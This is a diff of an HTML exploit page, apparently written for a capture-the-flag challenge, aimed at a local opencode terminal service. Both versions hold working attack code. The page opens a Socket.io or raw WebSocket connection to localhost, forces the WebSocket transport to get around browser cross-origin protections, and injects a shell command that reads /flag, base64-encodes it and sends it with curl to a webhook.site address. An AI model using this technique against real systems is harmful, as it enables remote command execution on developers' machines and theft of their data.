@@ -1,40 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>OpenShell Exploit</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 </head>
 <body>
     <script>
-        // 目标是本地 opencode 服务
-        const target = "http://localhost:3000";
-        const socket = io(target);
+        const target = "http://127.0.0.1:4096";
+        const exfil = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4"; 
 
-        // 你的接收平台 (替换为你的 Webhook 地址)
-        const exfil = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";
-
-        socket.on("connect", () => {
-            console.log("Connected to local OpenShell");
-
-            // 构造 Payload 命令
-            // 1. 修改 flag 权限 
-            // 2. 将 flag 内容读取并通过 curl 发出
-            const cmd = "chmod 444 /flag && curl " + exfil + "?flag=$(cat /flag)\n";
-
-            // opencode-ai 1.2.16 通常监听 "data" 或 "input" 事件来接收终端输入
-            socket.emit("data", cmd);
-            
-            // 备用：有些版本使用 "input"
-            socket.emit("input", cmd);
+        // 1. 建立 Socket.io 连接
+        const socket = io(target, {
+            transports: ['websocket'] // 强制使用 WebSocket 绕过 PNA/CORS
         });
 
-        // 也可以尝试直接发送原始 WebSocket 消息以防 socket.io 版本不匹配
-        const ws = new WebSocket("ws://localhost:3000/socket.io/?EIO=4&transport=websocket");
+        socket.on("connect", () => {
+            console.log("Connected to OpenCode Terminal");
+
+            // 2. 构造命令：修改 flag 权限 -> 读取并 Base64 编码 -> 外传
+            const cmd = "chmod 444 /flag && curl " + exfil + "?flag=$(cat /flag | base64)\n";
+
+            // 3. 向终端发送数据
+            // opencode-ai 通常监听 'data' 或 'input' 事件
+            socket.emit("data", cmd);
+            
+            // 兜底：尝试另一个可能的事件名
+            setTimeout(() => {
+                socket.emit("input", cmd);
+            }, 500);
+        });
+
+        // 备用：原生 WebSocket 方案（防止 Socket.io 版本不匹配）
+        const ws = new WebSocket("ws://127.0.0.1:4096/socket.io/?EIO=4&transport=websocket");
         ws.onopen = () => {
-            // 42 表示消息，["data", "..."] 是 Socket.io 的格式
-            ws.send('42["data","chmod 444 /flag && curl ' + exfil + '?flag=$(cat /flag)\\n"]');
+            const rawCmd = '42["data","chmod 444 /flag && curl ' + exfil + '?flag=$(cat /flag | base64)\\n"]';
+            ws.send(rawCmd);
         };
     </script>
-    <h1>Processing...</h1>
+    <h1>Exploit in progress...</h1>
 </body>
 </html>
